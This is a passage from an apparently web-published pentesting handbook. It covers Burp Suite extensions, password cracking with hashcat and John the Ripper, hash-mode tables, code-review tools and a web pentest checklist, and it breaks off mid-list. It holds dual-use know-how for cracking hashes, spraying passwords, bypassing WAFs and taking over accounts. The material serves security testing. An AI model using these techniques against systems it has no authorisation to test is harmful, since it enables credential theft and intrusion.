<li><a href="https://portswigger.net/bappstore/c9fb79369b56407792a7104e3c4352fb">Software Vulnerability Scanner</a> Passive scan to detect vulnerable software versions</li>
<li><a href="https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943">Param Miner</a> Passive scan to detect hidden or unlinked parameters, cache poisoning</li>
<li><a href="https://portswigger.net/bappstore/9cff8c55432a45808432e26dbb2b41d8">Backslash Powered Scanner</a> Active scan for SSTI detection</li>
<li><a href="https://portswigger.net/bappstore/60f172f27a9b49a1b538ed414f9f27c3">CSRF Scanner</a> Passive CSRF detection</li>
<li><a href="https://portswigger.net/bappstore/ae1cce0c6d6c47528b4af35faebc3ab3">Freddy</a> Active and Passive scan for Java and .NET deserialization</li>
<li><a href="https://portswigger.net/bappstore/f923cbf91698420890354c1d8958fee6">JSON Web Tokens</a> decode and manipulate JSON web tokens</li>
<li><a href="https://portswigger.net/bappstore/6e0b53d8c801471c9dc614a016d8a20d">Reissue Request Scripter</a> generates scripts for Python, Ruby, Perl, PHP and PowerShell</li>
<li><a href="https://github.com/artssec/burp-exporter">Burp-exporter</a> other extension for export request to multiple languages</li>
<li><a href="https://portswigger.net/bappstore/36238b534a78494db9bf2d03f112265c">Retire.js</a> Passive scan to find vulnerable JavaScript libraries</li>
<li><a href="https://portswigger.net/bappstore/7c1ca94a61474d9e897d307c858d52f0">Web Cache Deception Scanner</a> Active scan for Web Cache Deception vulnerability</li>
<li><a href="https://portswigger.net/bappstore/76c500c3fdba4a37a6fca46fe18d8ada">Cookie decrypter</a> Passive check for decrypt/decode Netscaler, F5 BigIP, and Flask cookies</li>
<li><a href="https://github.com/elkokc/reflector">Reflector</a> Passive scan to find reflected XSS</li>
<li><a href="https://portswigger.net/bappstore/7ec6d429fed04cdcb6243d8ba7358880">J2EEScan</a> Active checks to discover different kind of J2EE vulnerabilities</li>
<li><a href="https://portswigger.net/bappstore/aaaa60ef945341e8a450217a54a11646">HTTP Request Smuggler</a> Active scanner and launcher for HTTP Request Smuggling attacks</li>
<li><a href="https://portswigger.net/bappstore/ee1c45f4cc084304b2af4b7e92c0a49d">Flow</a> History of all burp tools, extensions and tests</li>
<li><a href="https://portswigger.net/bappstore/c9c37e424a744aa08866652f63ee9e0f">Taborator</a> Allows Burp Collaborator in a new tab</li>
<li><a href="https://portswigger.net/bappstore/9abaa233088242e8be252cd4ff534988">Turbo Intruder</a> Useful for sending large numbers of HTTP requests (Race cond, fuzz, user enum)</li>
<li><a href="https://portswigger.net/bappstore/f89f2837c22c4ab4b772f31522647ed8">Auto Repeater</a> Automatically repeats requests with replacement rules and response diffing</li>
<li><a href="https://portswigger.net/bappstore/b2244cbb6953442cb3c82fa0a0d908fa">Upload Scanner</a> Tests multiple upload vulnerabilities</li>
<li><a href="https://github.com/portswigger/poi-slinger">poi Slinger</a>: Active scan check to find PHP object injection</li>
<li><a href="https://portswigger.net/bappstore/228336544ebe4e68824b5146dbbd93ae">Java Deserialization Scanner</a> Active and passive scanner to find Java deserialization vulnerabilities</li>
<li><a href="https://portswigger.net/bappstore/f9bbac8c4acf4aefa4d7dc92a991af2f">Autorize</a> Used to detect IDORs</li>
<li><a href="https://portswigger.net/bappstore/9b5c532966ca4d5eb13c09c72ba7aac2">Match/Replace Session Action</a> Provides a match and replace function as a Session Handling Rule.</li>
<li><a href="https://portswigger.net/bappstore/e2a137ad44984ccb908375fa5b2c618d">.NET Beautifier</a> Easy view for VIEWSTATE parameter</li>
<li><a href="https://portswigger.net/bappstore/594a49bb233748f2bc80a9eb18a2e08f">Wsdler</a> generates SOAP requests from WSDL request</li>
<li><a href="https://portswigger.net/bappstore/2495f6fb364d48c3b6c984e226c02968">Collaborator Everywhere</a> Inject headers to reveal backend systems by causing pingbacks</li>
<li><a href="https://github.com/0xC01DF00D/Collabfiltrator">Collabfiltrator</a> Exfiltrate blind remote code execution output over DNS</li>
<li><a href="https://portswigger.net/bappstore/ae2611da3bbc4687953a1f4ba6a4e04c">Bypass WAF</a> Add some headers to bypass some WAFs</li>
<li><a href="https://github.com/CompassSecurity/SAMLRaider">SAMLRaider</a> for testing SAML infrastructures, messages and certificates</li>
<li><a href="https://github.com/GainSec/GoldenNuggets-1">GoldenNuggets-1</a> create wordlists from target</li>
<li><a href="https://portswigger.net/bappstore/470b7057b86f41c396a97903377f3d81">Logger++</a> Log for every burp tool and allows highlight, filter, grep, export...</li>
<li><a href="https://portswigger.net/bappstore/6bf7574b632847faaaa4eb5e42f1757c">OpenAPI Parser</a> Parse and fetch OpenAPI documents directly from a URL</li>
<li><a href="https://github.com/portswigger/co2">CO2</a>: Multiple functions such sqlmapper, cewler</li>
<li><a href="https://github.com/PortSwigger/xss-validator">XSSValidator</a>: XSS intruder payload generator and checker</li>
<li><a href="https://github.com/ewilded/shelling">Shelling</a>: command injection payload generator</li>
<li><a href="https://github.com/bytebutcher/burp-send-to">burp-send-to</a>: Adds a customizable "Send to..."-context-menu.</li>
<li><a href="https://github.com/ethicalhackingplayground/ssrf-king?s=09">ssrf-king</a>: Automates SSRF detection</li>
</ul>
<h2 id="private-collaborator-server"><a class="header" href="#private-collaborator-server">Private collaborator server</a></h2>
<p>https://github.com/putsi/privatecollaborator</p>
<p>https://blog.roughwire.com/?p=24</p>
<p>https://teamrot.fi/self-hosted-burp-collaborator-with-custom-domain</p>
<h2 id="burp-macros"><a class="header" href="#burp-macros">Burp macros</a></h2>
<p>https://akshita-infosec.medium.com/burp-macros-what-why-how-151df8901641</p>
<h2 id="collaborator-ssrf-explotation-mindmap"><a class="header" href="#collaborator-ssrf-explotation-mindmap">Collaborator SSRF explotation <a href="https://github.com/iustin24/SSRF">mindmap</a></a></h2>
<p><img src="others/../.gitbook/assets/image%20(20).png" alt="" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="password-cracking"><a class="header" href="#password-cracking">Password cracking</a></h1>
<h2 id="identify-hash"><a class="header" href="#identify-hash">Identify hash</a></h2>
<pre><code class="language-bash"># https://github.com/noraj/haiti
haiti [hash]
</code></pre>
<h2 id="dictionary-creation"><a class="header" href="#dictionary-creation">Dictionary creation</a></h2>
<pre><code class="language-bash"># Pydictor
# https://www.github.com/landgrey/pydictor.git
pydictor.py -extend TERM --leet 0 1 2 11 21 --len 4 20

# Username generator
# https://github.com/benbusby/namebuster
namebuster https://example.com
namebuster "term1, term2"

https://app.wgen.io/

</code></pre>
<h3 id="examples"><a class="header" href="#examples">Examples</a></h3>
<pre><code class="language-bash"># Numeric dictionary length 4
python3 pydictor.py -base d --len 4 4

# Capital letters dictionary length 4
python3 pydictor.py -base c --len 4 4

# Prepend word + digits 5 length
python3 pydictor.py --len 5 5 --head raj -base d

# Append word after digits 5 length
python3 pydictor.py --len 5 5 --tail raj -base d

# Permute chars in word
python3 pydictor.py -char raj

# Multiple permutations
python3 pydictor.py -chunk abc ABC 666 . _ @ "'"

# Dictionary based in word, added complexity 4 and fixed length
python pydictor.py -extend raj --level 4 --len 1 6

# Interactive mode
python3 pydictor.py --sedb
</code></pre>
<h3 id="options"><a class="header" href="#options">Options</a></h3>
<pre><code class="language-bash">-base dLc # Base digits, Lowercase letters and Capital letters
--encode b64 # Encode output
</code></pre>
<h2 id="jtr"><a class="header" href="#jtr">jtr</a></h2>
<pre><code class="language-bash">john --wordlist=/usr/share/wordlists/rockyou.txt hash
john --rules --wordlist=/usr/share/wordlists/rockyou.txt hash
</code></pre>
<h2 id="hashcat"><a class="header" href="#hashcat">Hashcat</a></h2>
<h3 id="wiki"><a class="header" href="#wiki">Wiki</a></h3>
<p>https://hashcat.net/wiki/doku.php?id=hashcat</p>
<h3 id="hashes"><a class="header" href="#hashes">Hashes</a></h3>
<p>https://openwall.info/wiki/john/sample-hashes</p>
<p>https://hashcat.net/wiki/doku.php?id=example_hashes</p>
<h3 id="examples-1"><a class="header" href="#examples-1">Examples</a></h3>
<pre><code class="language-bash"># Dictionary
hashcat -m 0 -a 0 hashfile dictionary.txt -O --user -o result.txt

# Dictionary + rules
hashcat -m 0 -w 3 -a 0 hashfile dictionary.txt -O -r haku34K.rule --user -o result.txt

# Mask bruteforce (length 1-8 A-Z a-z 0-9)
hashcat -m 0 -w 3 -a 3 hashfile ?1?1?1?1?1?1?1?1 --increment -1 --user ?l?d?u
hashcat -m 0 -w 3 -a 3 hashfile suffix?1?1?1 -i -1 --user ?l?d

# Modes
-a 0 = Dictionary (also with rules)
-a 3 = Bruteforce with mask 

# Max performance options
--force -O -w 3 --opencl-device-types 1,2

# Output results
-o result.txt

# Ignore usernames in hashfile
--user/--username

# Masks
?l = abcdefghijklmnopqrstuvwxyz
?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ
?d = 0123456789
?s = «space»!"#$%&amp;'()*+,-./:; &gt;?@[\]^_`{|}~
?a = ?l?u?d?s
?b = 0x00 - 0xff
</code></pre>
<h3 id="useful-hashes"><a class="header" href="#useful-hashes">Useful hashes</a></h3>
<h4 id="linux-hashes---etcshadow"><a class="header" href="#linux-hashes---etcshadow">Linux Hashes - /etc/shadow</a></h4>
<div class="table-wrapper"><table><thead><tr><th>ID</th><th>Description</th></tr></thead><tbody>
<tr><td>500</td><td>md5crypt $1$, MD5(Unix)</td></tr>
<tr><td>200</td><td>bcrypt $2*$, Blowfish(Unix)</td></tr>
<tr><td>400</td><td>sha256crypt $5$, SHA256(Unix)</td></tr>
<tr><td>1800</td><td>sha512crypt $6$, SHA512(Unix)</td></tr>
</tbody></table>
</div>
<h4 id="windows-hashes"><a class="header" href="#windows-hashes">Windows Hashes</a></h4>
<div class="table-wrapper"><table><thead><tr><th>ID</th><th>Description</th></tr></thead><tbody>
<tr><td>3000</td><td>LM</td></tr>
<tr><td>1000</td><td>NTLM</td></tr>
</tbody></table>
</div>
<h4 id="common-hashes"><a class="header" href="#common-hashes">Common Hashes</a></h4>
<div class="table-wrapper"><table><thead><tr><th>ID</th><th>Description</th><th>Type</th></tr></thead><tbody>
<tr><td>900</td><td>MD4</td><td>Raw Hash</td></tr>
<tr><td>0</td><td>MD5</td><td>Raw Hash</td></tr>
<tr><td>5100</td><td>Half MD5</td><td>Raw Hash</td></tr>
<tr><td>100</td><td>SHA1</td><td>Raw Hash</td></tr>
<tr><td>10800</td><td>SHA-384</td><td>Raw Hash</td></tr>
<tr><td>1400</td><td>SHA-256</td><td>Raw Hash</td></tr>
<tr><td>1700</td><td>SHA-512</td><td>Raw Hash</td></tr>
</tbody></table>
</div>
<h4 id="common-files-with-password"><a class="header" href="#common-files-with-password">Common Files with password</a></h4>
<div class="table-wrapper"><table><thead><tr><th>ID</th><th>Description</th></tr></thead><tbody>
<tr><td>11600</td><td>7-Zip</td></tr>
<tr><td>12500</td><td>RAR3-hp</td></tr>
<tr><td>13000</td><td>RAR5</td></tr>
<tr><td>13200</td><td>AxCrypt</td></tr>
<tr><td>13300</td><td>AxCrypt in-memory SHA1</td></tr>
<tr><td>13600</td><td>WinZip</td></tr>
<tr><td>9700</td><td>MS Office   2003 $0/$1, MD5 + RC4</td></tr>
<tr><td>9710</td><td>MS Office   2003 $0/$1, MD5 + RC4, collider 1</td></tr>
<tr><td>9720</td><td>MS Office   2003 $0/$1, MD5 + RC4, collider 2</td></tr>
<tr><td>9800</td><td>MS Office   2003 $3/$4, SHA1 + RC4</td></tr>
<tr><td>9810</td><td>MS Office   2003 $3, SHA1 + RC4, collider 1</td></tr>
<tr><td>9820</td><td>MS Office   2003 $3, SHA1 + RC4, collider  2</td></tr>
<tr><td>9400</td><td>MS Office 2007</td></tr>
<tr><td>9500</td><td>MS Office 2010</td></tr>
<tr><td>9600</td><td>MS Office 2013</td></tr>
<tr><td>10400</td><td>PDF 1.1 - 1.3 (Acrobat 2 - 4)</td></tr>
<tr><td>10410</td><td>PDF 1.1 - 1.3 (Acrobat 2 - 4), collider  1</td></tr>
<tr><td>10420</td><td>PDF 1.1 - 1.3 (Acrobat 2 - 4), collider  2</td></tr>
<tr><td>10500</td><td>PDF 1.4 - 1.6 (Acrobat 5 - 8)</td></tr>
<tr><td>10600</td><td>PDF 1.7 Level 3 (Acrobat 9)</td></tr>
<tr><td>10700</td><td>PDF 1.7 Level 8 (Acrobat 10 - 11)</td></tr>
<tr><td>16200</td><td>Apple Secure Notes</td></tr>
</tbody></table>
</div>
<h4 id="database-hashes"><a class="header" href="#database-hashes">Database Hashes</a></h4>
<div class="table-wrapper"><table><thead><tr><th>ID</th><th>Description</th><th>Type</th><th>Example Hash</th></tr></thead><tbody>
<tr><td>12</td><td>PostgreSQL</td><td>Database Server</td><td>a6343a68d964ca596d9752250d54bb8a:postgres</td></tr>
<tr><td>131</td><td>MSSQL (2000)</td><td>Database Server</td><td>0x01002702560500000000000000000000000000000000000000008db43dd9b1972a636ad0c7d4b8c515cb8ce46578</td></tr>
<tr><td>132</td><td>MSSQL (2005)</td><td>Database Server</td><td>0x010018102152f8f28c8499d8ef263c53f8be369d799f931b2fbe</td></tr>
<tr><td>1731</td><td>MSSQL (2012, 2014)</td><td>Database Server</td><td>0x02000102030434ea1b17802fd95ea6316bd61d2c94622ca3812793e8fb1672487b5c904a45a31b2ab4a78890d563d2fcf5663e46fe797d71550494be50cf4915d3f4d55ec375</td></tr>
<tr><td>200</td><td>MySQL323</td><td>Database Server</td><td>7196759210defdc0</td></tr>
<tr><td>300</td><td>MySQL4.1/MySQL5</td><td>Database Server</td><td>fcf7c1b8749cf99d88e5f34271d636178fb5d130</td></tr>
<tr><td>3100</td><td>Oracle H: Type (Oracle 7+)</td><td>Database Server</td><td>7A963A529D2E3229:3682427524</td></tr>
<tr><td>112</td><td>Oracle S: Type (Oracle 11+)</td><td>Database Server</td><td>ac5f1e62d21fd0529428b84d42e8955b04966703:38445748184477378130</td></tr>
<tr><td>12300</td><td>Oracle T: Type (Oracle 12+)</td><td>Database Server</td><td>78281A9C0CF626BD05EFC4F41B515B61D6C4D95A250CD4A605CA0EF97168D670EBCB5673B6F5A2FB9CC4E0C0101E659C0C4E3B9B3BEDA846CD15508E88685A2334141655046766111066420254008225</td></tr>
<tr><td>8000</td><td>Sybase ASE</td><td>Database Server</td><td>0xc00778168388631428230545ed2c976790af96768afa0806fe6c0da3b28f3e132137eac56f9bad027ea2</td></tr>
</tbody></table>
</div>
<h4 id="kerberos-hashes"><a class="header" href="#kerberos-hashes">Kerberos Hashes</a></h4>
<div class="table-wrapper"><table><thead><tr><th>ID</th><th>Type</th><th>Example</th></tr></thead><tbody>
<tr><td>13100</td><td>Type 23</td><td>$krb5tgs$23$</td></tr>
<tr><td>19600</td><td>Type 17</td><td>$krb5tgs$17$</td></tr>
<tr><td>19700</td><td>Type 18</td><td>$krb5tgs$18$</td></tr>
<tr><td>18200</td><td>ASREP Type 23</td><td>$krb5asrep$23$</td></tr>
</tbody></table>
</div>
<h2 id="files-1"><a class="header" href="#files-1">Files</a></h2>
<pre><code class="language-bash">https://github.com/kaonashi-passwords/Kaonashi
https://github.com/NotSoSecure/password_cracking_rules
https://crackstation.net/files/crackstation-human-only.txt.gz
https://crackstation.net/files/crackstation.txt.gz
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="virtualbox"><a class="header" href="#virtualbox">VirtualBox</a></h1>
<h2 id="macos"><a class="header" href="#macos">MacOS</a></h2>
<pre><code class="language-text"># Tested in ElCapitan(10.11) to Catalina(10.15)
# Find and download your desired vmdk file
# Add your VM using existing disk
# Set Chipset ICH9
# Enable PAE/NX
# Video Memory 128 MB
# After created: 
cd "C:\Program Files\Oracle\VirtualBox\"
VBoxManage.exe modifyvm "VM Name" --cpuidset 00000001 000106e5 00100800 0098e3fd bfebfbff
VBoxManage setextradata "VM Name" "VBoxInternal/Devices/efi/0/Config/DmiSystemProduct" "iMac11,3"
VBoxManage setextradata "VM Name" "VBoxInternal/Devices/efi/0/Config/DmiSystemVersion" "1.0"
VBoxManage setextradata "VM Name" "VBoxInternal/Devices/efi/0/Config/DmiBoardProduct" "Iloveapple"
VBoxManage setextradata "VM Name" "VBoxInternal/Devices/smc/0/Config/DeviceKey" "ourhardworkbythesewordsguardedpleasedontsteal(c)AppleComputerInc"
VBoxManage setextradata "VM Name" "VBoxInternal/Devices/smc/0/Config/GetKeyFromRealSMC" 1

</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="code-review"><a class="header" href="#code-review">Code review</a></h1>
<h2 id="general-9"><a class="header" href="#general-9">General</a></h2>
<pre><code class="language-bash"># Guidelines
https://rules.sonarsource.com/

# Resource
https://vladtoie.gitbook.io/secure-coding/

# Tools
https://www.sonarqube.org/downloads/
https://deepsource.io/signup/
https://github.com/pyupio/safety
https://github.com/returntocorp/semgrep
https://github.com/WhaleShark-Team/cobra
https://github.com/mhaskar/Bughound

# Find interesting strings
https://github.com/s0md3v/hardcodes
https://github.com/micha3lb3n/SourceWolf
https://libraries.io/pypi/detect-secrets

# Tips
1.Important functions first
2.Follow user input
3.Hardcoded secrets and credentials
4.Use of dangerous functions and outdated dependencies
5.Developer comments, hidden debug functionalities, configuration files, and the .git directory
6.Hidden paths, deprecated endpoints, and endpoints in development
7.Weak cryptography or hashing algorithms
8.Missing security checks on user input and regex strength
9.Missing cookie flags
10.Unexpected behavior, conditionals, unnecessarily complex and verbose functions
</code></pre>
<h2 id="javascript"><a class="header" href="#javascript">JavaScript</a></h2>
<pre><code class="language-text">https://jshint.com/
https://github.com/jshint/jshint/
</code></pre>
<h2 id="nodejs"><a class="header" href="#nodejs">NodeJS</a></h2>
<pre><code class="language-text">https://github.com/ajinabraham/nodejsscan
</code></pre>
<h2 id="electron"><a class="header" href="#electron">Electron</a></h2>
<pre><code class="language-text">https://github.com/doyensec/electronegativity
https://github.com/doyensec/awesome-electronjs-hacking
</code></pre>
<h2 id="python-1"><a class="header" href="#python-1">Python</a></h2>
<pre><code class="language-text"># bandit
https://github.com/PyCQA/bandit
# pyt
https://github.com/python-security/pyt
# atheris
https://github.com/google/atheris
# aura
https://github.com/SourceCode-AI/aura
</code></pre>
<h2 id="net-1"><a class="header" href="#net-1">.NET</a></h2>
<pre><code class="language-text"># dnSpy
https://github.com/0xd4d/dnSpy

# .NET compilation
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe test.cs

# Cheatsheet
https://www.c-sharpcorner.com/UploadFile/ajyadav123/net-penetration-testing-cheat-sheet/
</code></pre>
<h2 id="php-2"><a class="header" href="#php-2">PHP</a></h2>
<pre><code class="language-text"># phpvuln
https://github.com/ecriminal/phpvuln
</code></pre>
<h2 id="cc"><a class="header" href="#cc">C/C++</a></h2>
<pre><code class="language-text"># flawfinder
https://github.com/david-a-wheeler/flawfinder
</code></pre>
<h2 id="java"><a class="header" href="#java">Java</a></h2>
<pre><code class="language-text"># JD-Gui
https://github.com/java-decompiler/jd-gui

# Java compilation step-by-step
javac -source 1.8 -target 1.8 test.java
mkdir META-INF
echo "Main-Class: test" &gt; META-INF/MANIFEST.MF
jar cmvf META-INF/MANIFEST.MF test.jar test.class
</code></pre>
<div class="table-wrapper"><table><thead><tr><th style="text-align: left">Task</th><th style="text-align: left">Command</th></tr></thead><tbody>
<tr><td style="text-align: left">Execute Jar</td><td style="text-align: left">java -jar [jar]</td></tr>
<tr><td style="text-align: left">Unzip Jar</td><td style="text-align: left">unzip -d [output directory] [jar]</td></tr>
<tr><td style="text-align: left">Create Jar</td><td style="text-align: left">jar -cmf META-INF/MANIFEST.MF [output jar] *</td></tr>
<tr><td style="text-align: left">Base64 SHA256</td><td style="text-align: left">sha256sum [file] | cut -d' ' -f1 | xxd -r -p | base64</td></tr>
<tr><td style="text-align: left">Remove Signing</td><td style="text-align: left">rm META-INF/<em>.SF META-INF/</em>.RSA META-INF/*.DSA</td></tr>
<tr><td style="text-align: left">Delete from Jar</td><td style="text-align: left">zip -d [jar] [file to remove]</td></tr>
<tr><td style="text-align: left">Decompile class</td><td style="text-align: left">procyon -o . [path to class]</td></tr>
<tr><td style="text-align: left">Decompile Jar</td><td style="text-align: left">procyon -jar [jar] -o [output directory]</td></tr>
<tr><td style="text-align: left">Compile class</td><td style="text-align: left">javac [path to .java file]</td></tr>
</tbody></table>
</div><div style="break-before: page; page-break-before: always;"></div><h1 id="pentesting-web-checklist"><a class="header" href="#pentesting-web-checklist">Pentesting Web checklist</a></h1>
<h2 id="recon-phase"><a class="header" href="#recon-phase">Recon phase</a></h2>
<ul>
<li>Large: a whole company with multiple domains</li>
<li>Medium: a single domain</li>
<li>Small: a single website</li>
</ul>
<h3 id="large-scope"><a class="header" href="#large-scope">Large scope</a></h3>
<ul>
<li><input disabled="" type="checkbox"/>
Get <a href="others/../recon/public-info-gathering.html#amass">ASN</a> for IP ranges (<a href="https://github.com/OWASP/Amass">amass</a>, <a href="https://github.com/yassineaboukir/Asnlookup">asnlookup</a>, <a href="https://github.com/j3ssie/metabigor">metabigor</a>, <a href="https://bgp.he.net/">bgp</a>)</li>
<li><input disabled="" type="checkbox"/>
Review latest <a href="https://www.crunchbase.com/">acquisitions</a></li>
<li><input disabled="" type="checkbox"/>
Get relationships by registrants (<a href="https://viewdns.info/reversewhois/">viewdns</a>)</li>
<li><input disabled="" type="checkbox"/>
Go to medium scope for each domain</li>
</ul>
<h3 id="medium-scope"><a class="header" href="#medium-scope">Medium scope</a></h3>
<ul>
<li><input disabled="" type="checkbox"/>
<a href="others/../recon/subdomain-enum/">Enumerate subdomains</a> (<a href="https://github.com/OWASP/Amass">amass</a> or <a href="https://github.com/projectdiscovery/subfinder">subfinder</a> with all available API keys)</li>
<li><input disabled="" type="checkbox"/>
Subdomain bruteforce (<a href="https://github.com/d3mondev/puredns">puredns</a> with <a href="https://gist.github.com/six2dez/a307a04a222fab5a57466c51e1569acf">wordlist</a>)</li>
<li><input disabled="" type="checkbox"/>
Permute subdomains (<a href="https://github.com/Josue87/gotator">gotator</a> or <a href="https://github.com/resyncgg/ripgen">ripgen</a> with <a href="https://gist.github.com/six2dez/ffc2b14d283e8f8eff6ac83e20a3c4b4">wordlist</a>)</li>
<li><input disabled="" type="checkbox"/>
Identify alive subdomains (<a href="https://github.com/projectdiscovery/httpx">httpx</a>)</li>
<li><input disabled="" type="checkbox"/>
<a href="others/../recon/subdomain-enum/subdomain-takeover.html">Subdomain takeovers</a> (<a href="https://github.com/projectdiscovery/nuclei-templates/tree/master/takeovers">nuclei-takeovers</a>)</li>
<li><input disabled="" type="checkbox"/>
Check for <a href="others/../enumeration/cloud/cloud-info-recon.html">cloud assets</a> (<a href="https://github.com/initstring/cloud_enum">cloudenum</a>)</li>
<li><input disabled="" type="checkbox"/>
<a href="others/../recon/public-info-gathering.html#shodan">Shodan</a> search</li>
<li><input disabled="" type="checkbox"/>
<a href="https://six2dez.gitbook.io/pentest-book/enumeration/ports#port-53-dns">Transfer zone</a></li>
<li><input disabled="" type="checkbox"/>
Subdomains recursive search</li>
<li><input disabled="" type="checkbox"/>
Take screenshots (<a href="https://github.com/sensepost/gowitness">gowitness</a>, <a href="https://github.com/maaaaz/webscreenshot">webscreenshot</a>, <a href="https://github.com/michenriksen/aquatone">aquatone</a>)</li>
</ul>
<h3 id="small-scope"><a class="header" href="#small-scope">Small scope</a></h3>
<ul>
<li><input disabled="" type="checkbox"/>
Identify web server, technologies and database (<a href="https://github.com/projectdiscovery/httpx">httpx</a>)</li>
<li><input disabled="" type="checkbox"/>
Try to locate <code>/robots.txt</code> , <code>/crossdomain.xml</code> <code>/clientaccesspolicy.xml</code> <code>/sitemap.xml</code> and <code>/.well-known/</code></li>
<li><input disabled="" type="checkbox"/>
Review comments on source code (Burp Engagement Tools)</li>
<li><input disabled="" type="checkbox"/>
<a href="others/../enumeration/web/crawl-fuzz.html">Directory enumeration</a></li>
<li><input disabled="" type="checkbox"/>
Web fuzzing (<a href="https://github.com/ffuf/ffuf">ffuf</a> and <a href="https://github.com/six2dez/OneListForAll">wordlist</a>)</li>
<li><input disabled="" type="checkbox"/>
Find<a href="others/../recon/public-info-gathering.html"> leaked ids, emails</a> (<a href="https://github.com/davidtavarez/pwndb">pwndb</a>)</li>
<li><input disabled="" type="checkbox"/>
Identify WAF (<a href="https://github.com/Ekultek/WhatWaf">whatwaf</a>, <a href="https://github.com/EnableSecurity/wafw00f">wafw00f</a>)</li>
<li><input disabled="" type="checkbox"/>
<a href="others/../recon/public-info-gathering.html#google">Google dorking</a></li>
<li><input disabled="" type="checkbox"/>
<a href="others/../recon/public-info-gathering.html#github">GitHub dorking</a>/Github tools (<a href="https://github.com/tillson/git-hound">githound</a>, <a href="https://github.com/damit5/gitdorks_go">gitdorks_go</a>)</li>
<li><input disabled="" type="checkbox"/>
Get urls (<a href="https://github.com/lc/gau">gau</a> , <a href="https://github.com/tomnomnom/waybackurls">waybackurls</a>, <a href="https://github.com/jaeles-project/gospider">gospider</a>)</li>
<li><input disabled="" type="checkbox"/>
Check potential vulnerable urls (<a href="https://github.com/1ndianl33t/Gf-Patterns">gf-patterns</a>)</li>
<li><input disabled="" type="checkbox"/>
Automatic XSS finder (<a href="https://github.com/hahwul/dalfox">dalfox</a>)</li>
<li><input disabled="" type="checkbox"/>
Locate admin and login panel</li>
<li><input disabled="" type="checkbox"/>
Broken link hijacking (<a href="https://github.com/stevenvachon/broken-link-checker">blc</a>)</li>
<li><input disabled="" type="checkbox"/>
Get all JS files (<a href="https://github.com/lc/subjs">subjs</a>, <a href="https://github.com/xnl-h4ck3r/xnLinkFinder">xnLinkFinder</a>)</li>
<li><input disabled="" type="checkbox"/>
JS hardcoded APIs and secrets (<a href="https://github.com/projectdiscovery/nuclei-templates/tree/4e3f843e15c68f816f0ef6abce5d30b6cf6d4a30/exposures/tokens">nuclei-tokens</a>)</li>
<li><input disabled="" type="checkbox"/>
JS analysis (<a href="https://github.com/lc/subjs">subjs</a>, <a href="https://github.com/w9w/JSA">JSA</a>, <a href="https://github.com/xnl-h4ck3r/xnLinkFinder">xnLinkFinder</a>, <a href="https://github.com/m4ll0k/BBTz">getjswords</a>)</li>
<li><input disabled="" type="checkbox"/>
Run automated scanner (<a href="https://github.com/projectdiscovery/nuclei">nuclei</a>)</li>
<li><input disabled="" type="checkbox"/>
Test CORS (<a href="https://github.com/chenjj/CORScanner">CORScanner</a>, <a href="https://github.com/s0md3v/Corsy">corsy</a>)</li>
</ul>
<h3 id="network"><a class="header" href="#network">Network</a></h3>
<ul>
<li><input disabled="" type="checkbox"/>
Check ICMP packets allowed</li>
<li><input disabled="" type="checkbox"/>
Check DMARC/SPF policies (<a href="https://github.com/BishopFox/spoofcheck">spoofcheck</a>)</li>
<li><input disabled="" type="checkbox"/>
Open ports with <a href="https://www.shodan.io/">Shodan</a></li>
<li><input disabled="" type="checkbox"/>
<a href="others/../recon/network-scanning.html#nmap">Port scan</a> to all ports</li>
<li><input disabled="" type="checkbox"/>
Check UDP ports (<a href="https://github.com/CiscoCXSecurity/udp-proto-scanner">udp-proto-scanner</a> or nmap)</li>
<li><input disabled="" type="checkbox"/>
Test <a href="others/../enumeration/ssl-tls.html">SSL </a>(<a href="https://github.com/drwetter/testssl.sh">testssl</a>)</li>
<li><input disabled="" type="checkbox"/>
If got creds, try password <a href="https://github.com/x90skysn3k/brutespray">spraying </a>for all the services discovered</li>
</ul>
<h3 id="preparation"><a class="header" href="#preparation">Preparation</a></h3>
<ul>
<li><input disabled="" type="checkbox"/>
Study site structure</li>
<li><input disabled="" type="checkbox"/>
Make a list with all possible test cases</li>
<li><input disabled="" type="checkbox"/>
Understand the business area and what their customer needs</li>
<li><input disabled="" type="checkbox"/>
Get a list of every asset (all_subdomains.txt, live_subdomains.txt, waybackurls.txt, hidden_directories.txt, nmap_results.txt, GitHub_search.txt, altdns_subdomain.txt, vulnerable_links.txt, js_files.txt)</li>
</ul>
<h2 id="user-management"><a class="header" href="#user-management">User management</a></h2>
<h3 id="registration"><a class="header" href="#registration">Registration</a></h3>
<ul>
<li><input disabled="" type="checkbox"/>
Duplicate registration (try with uppercase, +1@..., dots in name, etc)</li>
<li><input disabled="" type="checkbox"/>
Overwrite existing user (existing user takeover)</li>
<li><input disabled="" type="checkbox"/>
Username uniqueness</li>
<li><input disabled="" type="checkbox"/>
Weak password policy (user=password, password=123456,111111,abcabc,qwerty12)</li>
<li><input disabled="" type="checkbox"/>
<a href="others/../enumeration/web/email-attacks.html">Insufficient email verification process</a> (also my%00email@mail.com for account tko)</li>
<li><input disabled="" type="checkbox"/>
Weak registration implementation or allows disposable email addresses</li>
<li><input disabled="" type="checkbox"/>
Fuzz after user creation to check if any folder have been overwritten or created with your profile name</li>
<li><input disabled="" type="checkbox"/>
Add only spaces in password</li>
<li><input disabled="" type="checkbox"/>
Long password (&gt;200) leads to DoS</li>
<li><input disabled="" type="checkbox"/>
Corrupt authentication and session defects: Sign up, don't verify, request change password, change, check if account is active.</li>
<li><input disabled="" type="checkbox"/>
Try to re-register repeating same request with same password and different password too</li>
<li><input disabled="" type="checkbox"/>
If JSON request, add comma “email”:“victim@mail.com”,”hacker@mail.com”,“token”:”xxxxxxxxxx”</li>
<li><input disabled="" type="checkbox"/>
Lack of confirmation -&gt; try to register with company email.</li>
<li><input disabled="" type="checkbox"/>
Check OAuth with social media registration</li>
<li><input disabled="" type="checkbox"/>
Check state parameter on social media registration</li>
<li><input disabled="" type="checkbox"/>
Try to capture integration url leading integration takeover</li>
<li><input disabled="" type="checkbox"/>
Check redirections in register page after login</li>
<li><input disabled="" type="checkbox"/>
Rate limit on account creation</li>
<li><input disabled="" type="checkbox"/>
XSS on name or email</li>
</ul>
<h3 id="authentication"><a class="header" href="#authentication">Authentication</a></h3>
<ul>
<li><input disabled="" type="checkbox"/>
Username enumeration</li>
<li><input disabled="" type="checkbox"/>
Resilience to password guessing</li>
<li><input disabled="" type="checkbox"/>
